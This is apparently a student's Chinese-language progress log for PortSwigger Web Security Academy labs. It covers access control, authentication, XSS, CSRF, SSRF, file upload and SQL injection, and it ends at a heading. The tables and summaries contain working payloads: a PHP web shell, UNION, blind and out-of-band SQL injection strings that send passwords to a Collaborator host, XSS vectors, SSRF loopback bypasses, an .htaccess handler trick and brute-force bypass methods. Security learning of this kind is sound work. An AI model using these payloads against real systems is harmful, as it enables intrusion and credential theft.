# PortSwigger Lab 做题进度

> 靶场：https://portswigger.net/web-security

---

## Access Control（访问控制/越权）— 已完成 13/13 ✅（2026-08-11 完结）

> 关联笔记：[越权漏洞详解](./2026-08-08-越权漏洞详解.md)

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Unprotected admin functionality | 信息泄露 | `robots.txt` 暴露 `/administrator-panel`，直接访问删除用户 |
| 2 | Unprotected admin functionality with unpredictable URL | 前端隐藏 | 管理面板 URL 藏在页面源码/JS 里 |
| 3 | User role controlled by request parameter | Cookie 角色可改 | `Cookie: admin=false` → 改成 `true` |
| 4 | User role can be modified in user profile | Mass Assignment | 修改邮箱 JSON 加 `"roleid":2`，自己给自己授权 |
| 5 | User ID controlled by request parameter | IDOR（水平越权） | 改 URL 里 `id` 参数，看别人数据拿 API Key |
| 6 | User ID controlled by request parameter, with unpredictable user IDs | IDOR + GUID 枚举 | 用户 ID 是不可预测的 GUID，从评论/文章等公开位置收集 GUID，再改参数访问（今天新做） |
| 6 | User ID controlled by request parameter with data leakage in redirect | 302 Body 泄露 | 改 `id` → 302 重定向 → Burp 看 Body → 别人 API Key |
| 7 | User ID controlled by request parameter with password disclosure | 越权+明文密码 | 改 `id` → 别人资料页 → 密码明文在表单里 |
| 8 | Insecure direct object references | 聊天记录 IDOR | live chat 文件编号可遍历 → 下载别人聊天记录 |
| 9 | URL-based access control can be circumvented | Header 绕过 | 请求行写合法路径，`X-Original-URL: /admin` → 前端放行，后端认 Header |
| 10 | Method-based access control can be circumvented | HTTP 方法绕过 | POST 被权限校验拦 → 换 GET/POSTX → 校验跳过 |
| 11 | Multi-step process with no access control on one step | 多步流程校验缺失 | 修改邮箱等操作分多步，前几步校验权限、最后一步没校验 → 跳过前面直接请求最后一步（今天新做） |
| 12 | Referer-based access control | Referer 头伪造 | 管理操作依赖 Referer 头判断来源 → 伪造 Referer: https://xxx/admin 绕过（今天新做） |

---

## Authentication（认证缺陷）— 已完成 13/14（2026-08-11 开始，2026-08-14 更新）

> 关联笔记：[登录脆弱与认证缺陷](./2026-08-09-登录脆弱与认证缺陷.md)（总览）、[PortSwigger认证绕过实战](./2026-08-13-PortSwigger认证绕过实战.md)（Lab 8-11 实战）、[改密爆破与单请求多凭据](./2026-08-14-改密接口爆破与单请求多凭据.md)（Lab 12-13）

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Username enumeration via different responses | 用户名枚举（响应差异） | 登录失败响应不同：账号不存在 vs 密码错误 → 逐个试用户名，看响应区别 |
| 2 | 2FA simple bypass | 2FA 流程绕过 | 登录后直接访问受保护页面，跳过 2FA 验证步骤 |
| 3 | Password reset broken logic | 密码重置逻辑缺陷 | 重置流程中修改 username 参数指向目标账号，token 未绑定原账号 |
| 4 | Username enumeration via subtly different responses | 用户名枚举（细微差异） | 响应几乎相同，但个别字符/长度/状态码有细微差别 → 对比响应体找差异 |
| 5 | Username enumeration via response timing | 用户名枚举（响应时间差）+ 爆破保护绕过 | `X-Forwarded-For` 伪造 IP 绕过次数限制；超长密码放大时间差，按响应时间找有效用户名，再爆破密码（今天新做） |
| 6 | Broken brute-force protection, IP block | IP 封锁绕过（成功登录重置计数） | 连错 3 次封 IP，XFF 伪造无效 → 爆破与正确登录（wiener:peter）交替发送，成功登录把失败计数刷回 0（今天新做） |
| 7 | Username enumeration via account lock | 账户锁定枚举（防护机制当信号） | 有效账号连错 3 次触发锁定提示 → 用锁定提示枚举用户名；爆破密码时 grep extract 标记报错文案，正确密码的响应无报错即命中（今天新做） |
| 8 | 2FA bypass using a broken logic | 2FA 逻辑缺陷（verify 参数可控）+ 验证码爆破 | GET /login2 改 verify=carlos 触发目标验证码 → 爆破 4 位 mfa-code → 302 命中（Burp CE 限速，Python 并发替代） |
| 9 | Brute-forcing a stay-logged-in cookie | remember-me cookie 存密码哈希（可伪造） | cookie=base64(用户名:md5(密码)) → 预生成伪造 cookie 列表爆破 → 删掉 session cookie 只留 stay-logged-in → 200 命中即登录（官方用 Payload processing 动态转换） |
| 10 | Offline password cracking | 密码哈希进 cookie + 存储型 XSS 组合 | 评论区 XSS 偷 carlos 的 stay-logged-in cookie → 解码拿 MD5 → 离线破解（hashcat）→ 明文登录删账户 |
| 11 | Password reset poisoning via middleware | 密码重置投毒（重置链接域名可控） | 重置请求加 X-Forwarded-Host: 自己的 exploit server → 邮件链接指向攻击者 → carlos 点击 → token 进日志 → 拿自己合法链接换 token 改密 → 登录 |
| 12 | Password brute-force via password change | 改密接口爆破（锁定逻辑缺陷） | 两次新密码填不一致 → 错误当前密码不触发锁定可无限爆破；响应含 New passwords do not match 即密码正确（隐藏 username 字段改成 carlos）（今天新做） |
| 13 | Broken brute-force protection, multiple credentials per request | 单请求多凭据（计数粒度缺陷，EXPERT） | JSON 登录 body 的 password 改数组塞全部候选密码 → 一次请求试完 → 302 命中（2026-08-14 通关） |

## XSS 跨站脚本 — 已完成 7/30（2026-09-12 开始）

> 关联笔记：[PortSwigger XSS 实战前七题](./2026-09-12-PortSwigger-XSS实战前七题.md)（含三张实测表：上下文→向量 / 属性→自动触发 / jQuery 版本边界）

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Reflected XSS into HTML context with nothing encoded | 反射型 + 无编码 | 搜索词原样回显 → 直接插标签；投递用 exploit server 的 `location=` |
| 2 | Stored XSS into HTML context with nothing encoded | 存储型 + 无编码 | 评论里插标签存库，受害者浏览帖子即中 |
| 3 | DOM XSS in document.write sink using source location.search | DOM 型 + 输入落在属性里 | 右键检查元素看落点 → 闭合属性再插标签：`"><svg onload=print()>` |
| 4 | DOM XSS in innerHTML sink using source location.search | innerHTML 不执行 `<script>` | 换"会自己报错的元素"：`<img src=1 onerror=print()>` |
| 5 | DOM XSS in jQuery anchor href attribute sink using location.search source | URL 属性不需要尖括号 | `returnPath=javascript:print()` → 点 back 触发（需一次点击） |
| 6 | DOM XSS in jQuery selector sink using a hashchange event | hash 进 jQuery 选择器 + 老 jQuery | exploit server 放 iframe，`onload` 追加 payload 改 hash → hashchange 触发；jQuery ≤1.8.3 才可打 |
| 7 | Reflected XSS into attribute with angle brackets HTML-encoded | 尖括号被 HTML 实体编码 | 闭合引号 + 加事件属性（`"autofocus onfocus="print()`，或官方 `"onmouseover=`）；要多试属性直到受害者能触发 |

### XSS 知识点总结

**三类 sink ↔ 三种投递壳**（新题先问三句：payload 从哪进？服务端看得到吗？谁在什么时刻执行？）
- 反射/存储：payload 进服务端响应 → `<script>location='https://LAB/?q=payload'</script>` 或直接提交表单
- 纯 DOM（`location.hash` / `location.search`）：**服务端看不到 payload** → 必须 `iframe + onload` 制造事件

**DOM 型三个必记点**
1. `onload` 里的代码跑在**攻击者 origin**，真正执行 payload 的是**目标站自己的 JS**；iframe 只负责"把受害者带过去 + 改地址"
2. fragment 变化 = **同一文档内导航**（不重载、不发请求，只触发 `hashchange`）→ 所以不能把 payload 直接写在 `src` 里，只能"先加载空 `#`，再由 `onload` 追加"；且浏览器会把片段里的 `< >` 百分号编码，目标端要有 `decodeURIComponent` 才能还原
3. 同源策略：只能改 iframe 的**地址**，碰不到目标文档的 DOM（`contentDocument` = null / `location` 抛 SecurityError）

**属性注入（尖括号被编码时的正解）**
- 属性随便加，但执行与否取决于"那个事件会不会被触发"：`autofocus + onfocus`、`style animation + onanimationstart` 是**零交互**（最稳）；`onmouseover` / `onclick` / `href="javascript:"` 需要交互
- 官方 payload 结尾**不写引号**，借用页面原属性的闭合引号收尾
- 官方 Hint：**"你能弹 ≠ 受害者能弹"** → 多试属性 = 穷举（这也是后面 Practitioner 题 "event handlers and href attributes blocked" 的核心）

---

## CSRF 跨站请求伪造 — 已完成 4/11（2026-09-12 开始，第 5 关暂停）

> 关联笔记：CSRF 1-4 实战待补（暂定整块打完后并入当日笔记）
> 现状：1-4 已过（第 2/3/4 关都是 Practitioner）；第 5 关「token 绑 non-session cookie」暂停，先转 SSRF 模块

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | CSRF vulnerability with no defenses | 完全无防御 | 直接构造自动提交表单改邮箱：exploit server **Body** → Store → View exploit → Deliver to victim |
| 2 | CSRF where token validation depends on request method | 校验只覆盖 POST 分支（**方法维度**） | 换 GET 提交 + 不带 token → 走到不校验的那个分支 |
| 3 | CSRF where token validation depends on token being present | 参数存在才校验（**存在性维度**） | 删掉 csrf 参数；⚠️ 我实际是用第 2 关那套（GET + 无 token）过的 —— 两条缺陷在这条路径上重叠，**本题考点未单独验证**（待补对照实验：POST + 删 csrf） |
| 4 | CSRF where token is not tied to user session | token 不绑定会话（**归属维度**） | 用我自己账号抓来的合法 token 填进攻击页面：服务端只查「token 在不在合法池里」，**不查「属不属于这个会话」**；⚠️ token 单次有效 → 每次 Deliver 前必须重新抓一个（自测 View exploit 会消耗掉） |

### CSRF 知识点总结（我的版本）

**防 CSRF token 的三条命门 —— 漏任何一条就是一个绕过点**：

| 维度 | 正确做法 | 漏掉的后果 | 对应 lab |
|---|---|---|---|
| 方法 | 所有能改状态的入口（GET/POST…）都校验 | 换请求方法绕过 | 2 |
| 存在性 | 参数缺失 = 直接拒绝（不能「取不到就跳过」） | 删掉参数绕过 | 3 |
| 归属 | token 必须绑定当前会话（`session['csrf'] == token`） | 拿别人的 token 绕过 | 4 |

**一句话认知**：token 要同时满足「**是真的**」+「**必须带**」+「**是我的**」—— 三者缺一就是三个不同的绕过点。第 4 关漏的不是「值存不存在」，而是「值的归属」。

缺陷写法对照（审计/代码审计时一眼认出）：

```python
# ❌ 只在有值时校验（Lab 3）
if token and token != session['csrf']: reject()
# ❌ 只查全局池子，不绑会话（Lab 4）
if token not in VALID_TOKEN_POOL: reject()
# ✅ 正确
if not token or token != session.get('csrf'): reject()
```

**读 writeup 的反射**：`YOUR-LAB-ID` / `$param1name` / `$param1value` / `ATTACKER.COM` 都是**占位符**；判断标准 =「这个字符串在真实请求里出现过吗？」（`$param1name` 要换成请求体里真实的参数名，本题 = `email`）。

**过关判定**：不看状态码，去 My account 页面确认邮箱真的变了。


---

## SSRF 服务端请求伪造 — 已完成 5/7（2026-09-12 开始）

> 关联笔记：[PortSwigger SSRF 前三关实战与 Collaborator 认知](./2026-09-12(续)-PortSwigger-SSRF前三关与Collaborator.md)
> 7 关递进：回显型（打本机/打内网）→ 盲打 OOB → 黑名单绕过 → 开放重定向绕过 → Shellshock 盲打 → 白名单绕过

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Basic SSRF against the local server | 回显型 SSRF（服务端代你访问本机） | 商品页 Check stock 的 `stockApi` 换成 `http://localhost/admin` → 从返回 HTML 读删除链接 → `stockApi=http://localhost/admin/delete?username=carlos` |
| 2 | Basic SSRF against another back-end system | 回显型 + 内网探测 | `stockApi=http://192.168.0.1:8080/admin`，末位八位组设 Intruder Numbers payload 1→255 → 状态码 200 那条就是内网 admin → 改路径 `/admin/delete?username=carlos` |
| 3 | Blind SSRF with out-of-band detection | **盲打**（不回显，靠带外信号）+ 注入点在**请求头** | 商品页文档请求的 `Referer` 域名段换成 Burp Collaborator 域 → Send → Collaborator Poll now → 出现 DNS + HTTP（Source IP = 靶场）= 过关 |
| 4 | SSRF with blacklist-based input filter | 黑名单绕过（后端拦 `localhost` / `127.0.0.1`） | 环回地址等价写法绕过：`127.1` / 十进制 `2130706433` / 八进制 `0177.0.0.1` / 十六进制 `0x7f000001` → 打内网 admin 删 carlos |
| 5 | SSRF with filter bypass via open redirection | 白名单 + 开放重定向绕过 | 用站点自身 open-redirect 接口当跳板（`path=` 参数指向内网 `192.168.0.1:8080/admin/delete?username=carlos`）→ 先过白名单再拐进内网 |

### SSRF 知识点总结（我的版本）

- **三形态**：回显型（看响应）→ 回显型·打内网（看状态码/内容）→ **盲打**（看带外：Collaborator 的 DNS + HTTP）。
- **盲打三问**：谁在发请求？我给的地址会到哪？我怎么知道它去了？（= 判定信号从"响应"换成"带外交互"）
- **注入点特征**：值"长得像 URL/域名/路径/IP"的参数（`stockApi`/`url`/`dest`/`callback`/`webhook`…）**以及请求头**（`Referer`/`User-Agent`/`X-Forwarded-For`/`Host`）。
- **坑**：改了值但没换成自己的带外域（等于让服务端访问它自己）→ 面板空白；lab 防火墙只放行**默认公共** Collaborator；自测流量会污染记录（看 Source IP/UA 区分）。


---

## 文件上传 — 已完成 4/7（2026-09-18 开始）

> 关联笔记：[PortSwigger 文件上传实战（决策型：先看现象→判定卡在第几层→查表拿钥匙）](./2026-09-18(续)-PortSwigger文件上传模块实战.md)
> 已通关 Lab 1-4（Lab 1-2 按官方标准解法记录，若我当时的操作有出入，告一声我改）
> 模块 7 关递进：无过滤 → Content-Type 绕过 → **路径穿越** → **后缀黑名单** → 混淆扩展名（空字节）→ polyglot 图片马 → 条件竞争

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Remote code execution via web shell upload | 零验证（无任何过滤） | 建 `exploit.php`（内容 `<?php echo file_get_contents('/home/carlos/secret'); ?>`）当头像传上去 → 从"加载头像的 GET"认出存储目录 → 直接 GET `/files/avatars/exploit.php` → 响应里就是 secret（零防护，不需要任何绕过） |
| 2 | Web shell upload via Content-Type restriction bypass | **只校验 Content-Type**（不看后缀、不看内容） | 同一个 `exploit.php`，在 multipart 里把文件 part 的 `Content-Type` 改成 `image/jpeg` → 通过校验 → GET 即执行 |
| 3 | Web shell upload via path traversal | **能上传 ≠ 能执行**（该目录关了执行）+ 文件名路径穿越 | GET `/files/avatars/exploit.php` 回**源码纯文本**=该目录不解析 → 只有 **POST 的 `filename`** 能改落盘位置（改 GET 的文件名没用）→ `filename="../exploit.php"` 被剥成 `avatars/exploit.php` → 编码斜杠 `filename="..%2fexploit.php"` 回显带 `../` 即绕过（**先清洗后解码**）→ GET `/files/avatars/..%2fexploit.php` 得 secret |
| 4 | Web shell upload via extension blacklist bypass | 后缀黑名单 + **配置层**绕过（题眼：黑名单的"配置"有根本缺陷） | `.php3` 能传但**不解析**（引擎映射表里没这一行）→ 传 `.htaccess`（**Content-Type 改 `text/plain`**）用 `AddType application/x-httpd-php .自造后缀` 把后缀映射成 PHP → 回原请求把 payload 后缀换成同一个 → GET 时响应头出现 `Set-Cookie`/`text/html` = 执行（⚠️ `.htaccess` 无后缀，黑名单从设计上抓不到它） |

### 文件上传知识点总结（我的版本 · 决策向）

- **两层模型**：应用层管「能不能落盘」（黑白名单 / Content-Type / 内容检测 / 字段名）；服务器层管「能不能执行」（后缀 → handler 映射表、目录是否允许执行）。**绕第一层 ≠ RCE**。
- **第一层的两个极端（Lab 1 / Lab 2）**：Lab 1 **什么都不查**（传 `.php` 直接可执行）；Lab 2 **只查 Content-Type**（不看后缀、不看内容）→ 只改它检查的那一个维度：multipart 里该 part 的 `Content-Type: image/jpeg`。⇒ **判据：服务端「看什么」，我就「改什么」**，绕过只针对它实际检查的那个维度，别做无用功。
- **「不解析」两条分岔（先分岔再选钥匙）**：① **位置问题** —— 目录执行被关 → 路径穿越写到可执行目录（Lab 3）；② **类型问题** —— 我的后缀不被引擎认 → 改映射（Apache `.htaccess` / IIS `web.config` / PHP-FPM `.user.ini`）（Lab 4）；③ **没有脚本引擎**（Flask/Node）→ 换同源 XSS / SSTI。
- **执行判据看响应头，不看内容**：`text/plain`+`Last-Modified`=静态直出；`text/html`+`Set-Cookie`=已执行；`304`=浏览器缓存障眼法（带 `?v=1` 重发）。
- **先定栈再定手法**：响应头 `Server` 决定能不能用 `.htaccess`（nginx 没有目录级配置，这条路不存在）。
- **免费探针**：上传响应回显存储路径 / `.htaccess` 写非法指令看是否 500（=哨兵，证明它被读了）。
- 详见笔记[「三、决策卡」](./2026-09-18(续)-PortSwigger文件上传模块实战.md)。

---

## SQL 注入 — 已完成 18/18 ✅（2026-09-23 收官）

> 关联笔记：[PortSwigger SQL 注入模块收官 — 盲注四代信道与 XML 编码绕过](./2026-09-23-PortSwigger-SQL注入盲注四信道与WAF编码绕过.md)
> ⚠️ Lab 1-10 是本模块**早期完成**的（当时未留细节记录），那 10 行按官方标准解法补记；Lab 11-18 是 2026-09-21~23 亲手打通、逐条核过官方解的记录。若我早前的做法与此不同，告一声我改。

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | 数字/字符型注入 · 条件恒真 | 商品分类参数加 `'--`（或 `+OR+1=1--`）→ 原查询条件被注释/恒真 → 连隐藏商品一起返回 |
| 2 | SQL injection vulnerability allowing login bypass | 认证绕过 | 用户名填 `administrator'--` → 密码校验被注释掉 → 直接以 administrator 登录 |
| 3 | SQL injection attack, querying the database type and version on Oracle | 定方言 + UNION 回显 | 列数先 `ORDER BY N` 定 → `'+UNION+SELECT+banner,NULL+FROM+v$version--`（Oracle 必须 `from dual`） |
| 4 | SQL injection attack, querying the database type and version on MySQL and Microsoft | 定方言 | `'+UNION+SELECT+@@version,NULL--` |
| 5 | SQL injection attack, listing the database contents on non-Oracle databases | 元数据枚举（两步） | `information_schema.tables` → `information_schema.columns` → 拼出真列名脱库 |
| 6 | SQL injection attack, listing the database contents on Oracle | 元数据枚举（Oracle） | `all_tables` → `all_tab_columns`（表名全大写）→ `'||username||':'||password` 拼接脱库 |
| 7 | SQL injection UNION attack, determining the number of columns returned by the query | 列数探测 | `'+ORDER+BY+N--` 递增：报错那个 N 的前一个 = 列数（或 `UNION SELECT NULL,NULL…` 数空位） |
| 8 | SQL injection UNION attack, finding a column containing text | 回显列探测 | 逐列把 `NULL` 换成 `'a'`，页面冒出 a 的那列就是字符串列 |
| 9 | SQL injection UNION attack, retrieving data from other tables | 跨表脱库 | 定列数 → 定文本列 → `' UNION SELECT username,password FROM users--` |
| 10 | SQL injection UNION attack, retrieving multiple values in a single column | 单列多值拼接 | 只有一个回显位时拼起来：Oracle/PG/SQLite 用 `'||username||'~'||password`，MySQL 用 `concat()`/`0x3a` |
| 11 | Blind SQL injection with conditional responses | **盲注①内容信道** | TrackingId cookie 注入；页面 `Welcome back` 的有无 = 查询是否返回行；Intruder **Grep-Match** 加 `Welcome back`，打勾那行即命中，`SUBSTRING` 逐位取密码 |
| 12 | Blind SQL injection with conditional errors | **盲注②报错信道**（Oracle） | `xyz'||(SELECT CASE WHEN (条件) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` → 真 = **500**、假 = 200；看 Status 列即可判定；`ROWNUM=1` 防子查询多行、`SUBSTR` 逐位 |
| 13 | Visible error-based SQL injection | 报错**回显**型（非盲） | 页面上直接出现数据库报错 → 把查询结果拼进报错信息里带出来（类型转换报错），最省事的一类 |
| 14 | Blind SQL injection with time delays | **盲注③延时信道**（PG） | `x'||pg_sleep(10)--` → 响应耗时 10 秒 = 注入成立（无任何回显时的存在性判定） |
| 15 | Blind SQL injection with time delays and information retrieval | **盲注③延时 + 取数**（PG） | 堆叠语句 `x'%3BSELECT CASE WHEN (条件) THEN pg_sleep(10) ELSE pg_sleep(0) END--`；Intruder **Resource pool 单并发** + 按 `Response received` 列排序，~10000ms 那行命中 |
| 16 | Blind SQL injection with out-of-band interaction | **盲注④带外信道**（Oracle） | SQLi × XXE：`EXTRACTVALUE(xmltype('…<!ENTITY % remote SYSTEM "http://collab/">…'))` 让 XML 解析器去取外部 DTD → Collaborator 收到 **DNS** 即过关（不需要带数据） |
| 17 | Blind SQL injection with out-of-band data exfiltration | **盲注④带外 + 带数据** | 把静态域名段换成子查询：`"http://'||(SELECT password FROM users WHERE username='administrator')||'.collab/"` → 密码出现在 Collaborator 记录域名的**最左一段**（右边 32 位是唯一子域） |
| 18 | SQL injection with filter bypass via XML encoding | **WAF 绕过**（编码层差） | `POST /product/stock` 的 XML body 注入点；WAF 拦 SQL 关键词 → Hackvertor `hex_entities` 把 payload 编成 XML 实体（WAF 看编码后、数据库看解码后）→ `1 UNION SELECT username \|\| '~' \|\| password FROM users`（该查询只有 1 列，2 列会返回 `0 units`） |

### SQL 注入知识点总结（我的版本 · 决策向）

**① 盲注 = 换信道，不换骨架**（骨架四代通用：**存在性 → 长度 → 逐位**）

| 代 | 信道 | 判定信号 | 什么时候逼我用它 |
|---|---|---|---|
| 1 | 内容 | 页面多/少一行字（`Welcome back`） | 查询结果能影响正常渲染 |
| 2 | 报错 | HTTP 500 / 自定义错误页 | 应用把数据库报错暴露出来 |
| 3 | 延时 | 响应耗时（10s vs 0s） | 无回显、无报错，但查询**同步**执行 |
| 4 | 带外 OOB | Collaborator 收到 DNS/HTTP | 连延时都不可靠（查询**异步**、不阻塞响应） |

动手前先做「真假对照」自证信道：`' AND '1'='1` / `' AND '1'='2`（内容）· `1=1`/`1=2`（报错）· 10s/0s（延时）· 有/无记录（OOB）。**判定信号全哑时先怀疑自己的 payload。**

**② payload 怎么接进原语句 —— 四种接法（选法 = 类型 + 位置 + 有没有回显）**

| 接法 | 语法身份 | 前提 | 失效特征 → 自救 |
|---|---|---|---|
| `AND` / `OR` | WHERE 里的布尔连接词 | 表达式必须返回 **boolean** | PG `pg_sleep()` 返回 void → `argument of AND must be type boolean, not type void`，**解析期就死**（不是被拦）→ 换堆叠或包一层子查询 |
| `UNION` | 结果集拼接 | 列数/类型对齐 + **结果会被显示** | 盲注天然不适用（不回显）；`void` 也不能当列 |
| `\|\|` 拼接 | 原表达式里的字符串拼接 | 只能注入表达式 + **自己配平首尾引号** | 忘写尾部 `\|\|'` → 语法错（原语句的收尾引号没人配对） |
| `;` **堆叠** | 另起一条完整语句 | 数据库 **+ 驱动**都允许多语句 | 报错/无延时 = 驱动不允许多语句（MySQL `mysqli_query` 单语句 / PDO 预处理）→ 退回拼接路线 |
| `-- ` 注释 | 吃掉原语句剩余部分 | 注释符后必须有空格（URL 里 `--+` / `--%20`） | Oracle/SQLite 只认 `-- ` 和 `/**/`，**不认 `#`** |

**③ 方言矩阵（盲注最常撞的几行）**

| | MySQL | SQLite | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|---|---|
| 无表查询 | ✅ `select 1` | ✅ | ✅ | ❌ **必须 `from dual`** | ✅ |
| 拼接 | `concat()` / `0x3a` | `\|\|` / `char(58)` | `\|\|` | `\|\|` / `chr(58)` | `+` |
| 截子串 | `SUBSTRING` | `substr` | `SUBSTRING`/`SUBSTR` | **`SUBSTR`**（不认 SUBSTRING） | `SUBSTRING` |
| 注释 | `#` `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` | 只有 `-- ` `/**/` | `-- ` `/**/` |
| 限行 | `LIMIT` | `LIMIT` | `LIMIT` | **`ROWNUM`** | `TOP` |
| 延时原语 | `sleep(5)` | ❌ 没有 | `pg_sleep(5)` | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:5'` |
| 报错原语 | `updatexml()` | 基本没有 | `1/0` 类型错 | **`TO_CHAR(1/0)`** → ORA-01476 | `convert(int,…)` |
| 表名列名大小写 | 看建表 | 不敏感 | 小写 | 未加引号建的 → **全大写** | 不敏感 |

铁律：**报错原文 > 行为差异 > 栈指纹**；「`database()` 报 no such function」不是注入失败，是方言暴露。

**④ 编码层数 = 解码层数（WAF/过滤器绕过通用心法）**
数据经过几个解析器就有几层编码可做。WAF 只做字符串匹配、站在第一个解码器**前面** ⇒ **过滤发生在解码之前，利用发生在解码之后**。正反两个实例：`%253f`（编多了 → 服务端解一层得到字面 `%3f` → XML 非法、收不到回连）；Hackvertor `hex_entities`（**故意多编一层** → 过 WAF）。

**⑤ 判定信号在哪儿读（省得再查）**

| 信道 | 读取位置 |
|---|---|
| 内容 | Intruder → Settings → **Grep - Match** 加关键词，打勾那行命中 |
| 报错 | Intruder 结果表 **Status 列**（500 = 真） |
| 延时 | Intruder **`Response received` 列**（~10000ms = 真）；⚠️ Resource pool 设 **Maximum concurrent requests = 1** |
| 带外 | Collaborator **Poll now** → DNS 的 **Description** / HTTP 的 **Host 头**；数据在域名**最左一段**，右侧 32 位是唯一子域（信箱号） |


---

## 知识点总结

### 越权的四种模式

```
1. 闯空门
   → 知道 URL 就行，不需要登录/权限（Lab 1、2）

2. 伪造身份
   → Cookie 改 admin=true（Lab 3）
   → JSON 加 roleid=2（Lab 4）

3. 改资源 ID（水平越权 / IDOR）
   → 改 id 参数看别人数据（Lab 5、6、7、8）

4. 绕过校验规则
   → X-Original-URL 头欺骗（Lab 9）
   → 换 HTTP 方法逃逸（Lab 10）
```

### 测试方法论

```
每拿到一个接口：
  □ 不登录能不能访问？
  □ 低权限能不能访问？（换 Cookie）
  □ 改资源 ID 能不能看别人的？
  □ 换 HTTP 方法（GET/PUT/PATCH/POSTX）有没有不同的校验逻辑？
  □ 加 X-Original-URL / X-Forwarded-For 等头会不会被不同组件差异化处理？

每查看一遍源码（Ctrl+U）：
  □ robots.txt → 搜 admin / panel / api
  □ HTML 注释 → <!-- 里面常常有被注释掉的后台入口
  □ JS 文件 → 搜 admin / path / url

每看到一个响应：
  □ 302 的 Body → 可能藏着数据
  □ JSON → 多出来的字段（roleid / isAdmin）
  □ 表单 → 有没有隐藏的敏感字段
```

### 响应时间差枚举用户名 + IP 封锁绕过（Authentication Lab 5）

这一关的核心：登录接口有**基于 IP 的失败次数限制**，同一个 IP 试错太多次会被封锁，直接爆破不行。

#### 两个绕过点

**1. `X-Forwarded-For` 伪造 IP**

服务器用 `X-Forwarded-For` 头判断客户端 IP（常见于反代场景），但没校验这个头能不能改。每次请求换一个 IP 值，次数限制就形同虚设：

```
POST /login HTTP/1.1
Host: xxx
X-Forwarded-For: 192.168.1.<每次请求换>

username=carlos&password=xxx
```

**2. 响应时间差枚举用户名**

登录逻辑里：用户名不存在 → 直接返回"用户名或密码错误"（快）；用户名存在 → 还要对密码做 bcrypt 哈希对比（慢）。两个响应差了几十上百毫秒，把候选用户名挨个试一遍，响应明显变慢的那个就是有效用户名。

**关键坑（我卡了很久的原因）**：密码不能太短。密码越长，哈希计算耗时越久，时间差才明显；我用普通长度密码试，时间差淹没在网络抖动里根本分不出来。后来把密码设成 200 个 `A` 的超长串，时间差立刻肉眼可见。

#### 完整流程

```
1. 枚举用户名：username=候选词 & password=超长串（200 个 A），X-Forwarded-For 每次换
   → 按响应时间排序，最慢的那个就是有效用户名
2. 爆破密码：username=刚枚举出来的用户 & password=密码字典，X-Forwarded-For 每次换
   → 状态码 302 重定向 = 登录成功
```

注意 Intruder 里 `X-Forwarded-For` 也要设成 payload 一起遍历，否则试几十次就被 IP 封锁。

### IP 封锁绕过：成功登录重置计数（Authentication Lab 6）

这一关的机制和 Lab 5 正好相反：

- **封禁机制**：同一 IP 连续错误 3 次 → 封 IP，提示 too many incorrect login attempts
- **XFF 无效**：上一关的 `X-Forwarded-For` 伪造 IP 在这关不好使，服务端把这条路堵了
- **突破口**：一次**成功的登录会把失败计数刷新归零**

所以打法就是：**正确登录和爆破交替着来** —— 爆一个候选密码，再用已知账号 `wiener:peter` 成功登录一次把计数刷回 0，再爆下一个，循环。计数永远到不了 3，封禁永远不触发。

字典形态就是之前那个变形：每个候选密码下面插一行 `peter`（`passwords-peter.txt`），peter 行配 wiener 用户名，候选密码行配目标用户名。

类比：门禁系统按错 3 次密码会报警，但按对一次计数就清零——那每次都"错一次、对一次"交替着来，报警永远不触发。

> 换个角度看：这种"业务规则本身有豁免路径"的防护，比"纯 IP 计数"更容易被绕——防御时要考虑：成功登录是否应该重置**所有 IP** 的计数？重置粒度越粗，越容易被当跳板。

### 账户锁定枚举：防护机制本身就是信号（Authentication Lab 7）

这一关的机制：**有效账号连错 3 次就会触发锁定**，提示 `You have made too many incorrect login attempts. Please try again in 1 minute(s).`；无效账号永远只返回 `Invalid username or password`，怎么错都不会锁定。

所以"锁定"这个**防护机制本身**就成了枚举信号：

```
1. 枚举用户名：每个候选用户名连错 3 次以上
   → 出现锁定提示的那个就是有效账号（防护机制把账号存在性泄露了）
2. 爆破密码：Intruder 里 grep extract 标记报错文案
   → 正确密码的响应里没有报错信息（登录成功直接跳转）
   → 反向匹配：没有报错文案的那条响应 = 密码命中，不用专门绕封锁
```

我学到最关键的一点：**已知的机制（哪怕是防护）都能反过来当攻击入口**。锁定提示把"账号存不存在"泄露了出来；grep extract 标记报错文案 + 反向匹配，密码一步到位。

类比：门禁错 3 次就锁门——但这等于在门口贴告示"这个账号真实存在"，反而帮攻击者确认目标。

> 防御视角：错误文案必须统一（不管账号存在与否、是否锁定都返回同一句话）；锁定机制要防枚举（IP+账号组合计数），别让锁定提示变成账号存在性 oracle。

### 2FA 逻辑缺陷：verify 参数可控（Authentication Lab 8）

服务端用请求里的 `verify` 参数决定"正在验证谁的 2FA 码"，没绑定会话 → 改成 `verify=carlos` 就能让服务端生成/校验 carlos 的码。打法：`GET /login2?verify=carlos` 触发目标验证码 → 用自己的 session 爆 `mfa-code`（0000-9999）→ 302 命中。

关键坑：**Burp Community 版 Intruder 限速**（~1 req/s），线程拉满没用，10000 次要挂几小时；换 Python 60 并发 2 分钟跑完。失败 200 / 成功 302，信号干净。

### remember-me cookie 伪造爆破（Authentication Lab 9）

`stay-logged-in = base64(用户名:md5(密码))` —— 密码哈希直接进 cookie，结构公开可伪造。打法：离线预生成 `base64(carlos:md5(候选词))` 列表直接导入 Intruder 爆破，200 命中。**关键：删掉自己的 session cookie 只留 stay-logged-in**，否则服务端优先认 session，所有请求都返回你自己的账户页。

官方更优做法：Intruder **Payload processing**（Hash: MD5 → Add prefix: carlos: → Encode: Base64）请求时动态转换，同一份字典换 prefix 就能打任何用户；判定用 grep-match "Update email" 业务特征而非状态码。

### 离线破解：XSS 偷 cookie → MD5 还原（Authentication Lab 10）

